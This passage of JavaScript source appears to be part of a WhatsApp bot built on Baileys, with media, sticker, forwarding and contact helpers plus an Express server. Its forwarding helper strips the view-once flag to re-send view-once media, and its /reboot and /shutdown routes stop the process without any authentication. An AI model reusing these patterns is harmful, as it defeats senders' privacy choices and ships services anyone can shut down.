                    command.function(conn, mek, m, {from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
                } else if ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") {
                    command.function(conn, mek, m, {from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
                } else if (command.on === "sticker" && mek.type === "stickerMessage") {
                    command.function(conn, mek, m, {from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
                }
            });
        } catch (e) {
            console.error("Error handling incoming message event: ", e);
        }
    });

    //===================================================
    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
        let vtype;
        if (options.readViewOnce) {
            message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message? message.message.ephemeralMessage.message : (message.message || undefined);
            vtype = Object.keys(message.message.viewOnceMessage.message)[0];
            delete(message.message && message.message.ignore? message.message.ignore : (message.message || undefined));
            delete message.message.viewOnceMessage.message[vtype].viewOnce;
            message.message = {
              ...message.message.viewOnceMessage.message
            };
        }

        let mtype = Object.keys(message.message)[0];
        let content = await generateForwardMessageContent(message, forceForward);
        let ctype = Object.keys(content)[0];
        let context = {};
        if (mtype!= "conversation") context = message.message[mtype].contextInfo;
        content[ctype].contextInfo = {
          ...context,
          ...content[ctype].contextInfo
        };
        const waMessage = await generateWAMessageFromContent(jid, content, options? {
          ...content[ctype],
          ...options,
          ...(options.contextInfo? {
                contextInfo: {
                  ...content[ctype].contextInfo,
                  ...options.contextInfo
                }
            } : {})
        } : {});
        await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
        return waMessage;
    };

    //=================================================
    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
        let quoted = message.msg? message.msg : message;
        let mime = (message.msg || message).mimetype || '';
        let messageType = message.mtype? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
        const stream = await downloadContentFromMessage(quoted, messageType);
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        let type = await FileType.fileTypeFromBuffer(buffer) || { ext: 'bin' };
        let trueFileName = attachExtension? (filename + '.' + type.ext) : filename;
        await fs.writeFileSync(trueFileName, buffer);
        return trueFileName;
    };

    //=================================================
    conn.downloadMediaMessage = async(message) => {
        let mime = (message.msg || message).mimetype || '';
        let messageType = message.mtype? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
        const stream = await downloadContentFromMessage(message, messageType);
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        return buffer;
    };

    //================================================
    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
        let mime = '';
        let res = await axios.head(url);
        mime = res.headers['content-type'];
        if (mime.split("/")[1] === "gif") {
            return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true,...options }, { quoted: quoted,...options });
        }
        if (mime === "application/pdf") {
            return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption,...options }, { quoted: quoted,...options });
        }
        if (mime.split("/")[0] === "image") {
            return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption,...options }, { quoted: quoted,...options });
        }
        if (mime.split("/")[0] === "video") {
            return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4',...options }, { quoted: quoted,...options });
        }
        if (mime.split("/")[0] === "audio") {
            return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg',...options }, { quoted: quoted,...options });
        }
    };

    //==========================================================
    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
        let mtype = Object.keys(copy.message)[0];
        let isEphemeral = mtype === 'ephemeralMessage';
        if (isEphemeral) {
            mtype = Object.keys(copy.message.ephemeralMessage.message)[0];
        }
        let msg = isEphemeral? copy.message.ephemeralMessage.message : copy.message;
        let content = msg[mtype];
        if (typeof content === 'string') msg[mtype] = text || content;
        else if (content.caption) content.caption = text || content.caption;
        else if (content.text) content.text = text || content.text
        if (typeof content!== 'string') msg[mtype] = {
          ...content,
          ...options
        };
        if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
        if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid;
        else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid;
        copy.key.remoteJid = jid;
        copy.key.fromMe = sender === conn.user.id;

        return proto.WebMessageInfo.fromObject(copy);
    };

    //=====================================================
    conn.getFile = async(PATH, save) => {
        let res;
        let filename;
        let data = Buffer.isBuffer(PATH)? PATH : /^data:.*?\/.*?;base64,/i.test(PATH)? Buffer.from(PATH.split(`,`)[1], 'base64') : /^https?:\/\//.test(PATH)? await (res = await getBuffer(PATH)) : fs.existsSync(PATH)? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string'? PATH : Buffer.alloc(0);
        let type = await FileType.fileTypeFromBuffer(data) || {
            mime: 'application/octet-stream',
            ext: '.bin'
        };
        filename = path.join(__dirname, new Date * 1 + '.' + type.ext);
        if (data && save) fs.writeFileSync(filename, data);
        return {
            res,
            filename,
            size: data.length,
          ...type,
            data
        };
    };

    //=====================================================
    conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
        let types = await conn.getFile(PATH, true);
        let { filename, size, ext, mime, data } = types;
        let type = '',
            mimetype = mime,
            pathFile = filename;
        if (options.asDocument) type = 'document';
        if (options.asSticker || /webp/.test(mime)) {
            const { writeExif } = await import('./exif.js');
            let media = { mimetype: mime, data };
            pathFile = await writeExif(media, { packname: config.packname, author: config.packname, categories: options.categories? options.categories : [] });
            await fs.promises.unlink(filename);
            type = 'sticker';
            mimetype = 'image/webp';
        } else if (/image/.test(mime)) type = 'image';
        else if (/video/.test(mime)) type = 'video';
        else if (/audio/.test(mime)) type = 'audio';
        else type = 'document';
        await conn.sendMessage(jid, {
            [type]: { url: pathFile },
            mimetype,
            fileName,
          ...options
        }, { quoted,...options });
        return fs.promises.unlink(pathFile);
    };

    //=====================================================
    conn.parseMention = async(text) => {
        return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net');
    };

    //=====================================================
    conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
        let types = await conn.getFile(path, true);
        let { mime, ext, res, data, filename } = types;
        let type = '',
            mimetype = mime,
            pathFile = filename;
        if (options.asDocument) type = 'document';
        if (options.asSticker || /webp/.test(mime)) {
            const { writeExif } = await import('./exif.js');
            let media = { mimetype: mime, data };
            pathFile = await writeExif(media, { packname: options.packname? options.packname : config.packname, author: options.author? options.author : config.author, categories: options.categories? options.categories : [] });
            await fs.promises.unlink(filename);
            type = 'sticker';
            mimetype = 'image/webp';
        } else if (/image/.test(mime)) type = 'image';
        else if (/video/.test(mime)) type = 'video';
        else if (/audio/.test(mime)) type = 'audio';
        else type = 'document';
        await conn.sendMessage(jid, {
            [type]: { url: pathFile },
            caption,
            mimetype,
            fileName,
          ...options
        }, { quoted,...options });
        return fs.promises.unlink(pathFile);
    };

    //=====================================================
    conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
        let buffer;
        if (options && (options.packname || options.author)) {
            const { writeExifVid } = await import('./exif.js');
            buffer = await writeExifVid(buff, options);
        } else {
            buffer = await videoToWebp(buff);
        }
        await conn.sendMessage(jid, { sticker: { url: buffer },...options }, options);
    };

    //=====================================================
    conn.sendImageAsSticker = async (jid, buff, options = {}) => {
        let buffer;
        if (options && (options.packname || options.author)) {
            const { writeExifImg } = await import('./exif.js');
            buffer = await writeExifImg(buff, options);
        } else {
            buffer = await imageToWebp(buff);
        }
        await conn.sendMessage(jid, { sticker: { url: buffer },...options }, options);
    };

    //=====================================================
    conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') },...options }, { quoted });

    //=====================================================
    conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
        let buffer = Buffer.isBuffer(path)? path : /^data:.*?\/.*?;base64,/i.test(path)? Buffer.from(path.split(`,`)[1], 'base64') : /^https?:\/\//.test(path)? await getBuffer(path) : fs.existsSync(path)? fs.readFileSync(path) : Buffer.alloc(0);
        return await conn.sendMessage(jid, { image: buffer, caption: caption,...options }, { quoted });
    };

    //=====================================================
    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text,...options }, { quoted });

    //=====================================================
    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
        let buttonMessage = {
            text,
            footer,
            buttons,
            headerType: 2,
          ...options
        };
        conn.sendMessage(jid, buttonMessage, { quoted,...options });
    };

    //=====================================================
    conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
        let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer });
        let template = generateWAMessageFromContent(jid, proto.Message.fromObject({
            templateMessage: {
                hydratedTemplate: {
                    imageMessage: message.imageMessage,
                    "hydratedContentText": text,
                    "hydratedFooterText": footer,
                    "hydratedButtons": but
                }
            }
        }), options);
        conn.relayMessage(jid, template.message, { messageId: template.key.id });
    };

    //=====================================================
    conn.getName = (jid, withoutContact = false) => {
        let id = conn.decodeJid(jid);
        let v = id === '0@s.whatsapp.net'? { id, name: 'WhatsApp' } : id === conn.decodeJid(conn.user.id)? conn.user : {};
        return v.name || v.subject || v.verifiedName || id.split('@')[0];
    };

    // Vcard Functionality
    conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
        let list = [];
        for (let i of kon) {
            const name = await conn.getName(i + '@s.whatsapp.net');
            list.push({
                displayName: name,
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${name}\nFN:${config.OWNER_NAME}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${config.EMAIL}\nitem2.X-ABLabel:Email\nitem3.URL:https://github.com/${config.GITHUB}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${config.LOCATION};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
            });
        }
        await conn.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list },...opts }, { quoted });
    };

    // Status aka brio
    conn.setStatus = status => {
        conn.query({
            tag: 'iq',
            attrs: {
                to: '@s.whatsapp.net',
                type: 'set',
                xmlns: 'status',
            },
            content: [
                {
                    tag: 'status',
                    attrs: {},
                    content: Buffer.from(status, 'utf-8'),
                },
            ],
        });
        return status;
    };

    conn.serializeM = mek => sms(conn, mek);
}

app.get("/", (req, res) => { res.sendFile(path.join(__dirname, "index.html")); });
app.get("/reboot", (req, res) => { res.status(200).send("Rebooting..."); process.exit(1); });
app.get("/shutdown", (req, res) => { res.status(200).send("Shutting down..."); process.exit(0); });

app.listen(port, () => { console.log(`📡 Server active on port ${port}`); });

setTimeout(() => { connectToWA(); }, 5000);